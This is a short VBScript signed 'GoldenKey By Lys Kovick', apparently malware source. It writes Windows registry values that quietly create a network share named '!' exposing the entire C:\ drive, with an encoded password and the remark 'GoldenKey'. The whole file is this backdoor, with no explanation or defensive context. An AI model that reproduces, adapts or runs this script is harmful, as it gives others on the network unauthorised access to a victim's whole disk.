Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\!\Flags", 402, "REG_DWORD"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\!\Type", 0, "REG_DWORD"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\!\Path", "C:\"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\!\Parm1enc", -1837192444, "REG_BINARY"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\!\Remark", "GoldenKey"
'GoldenKey By Lys Kovick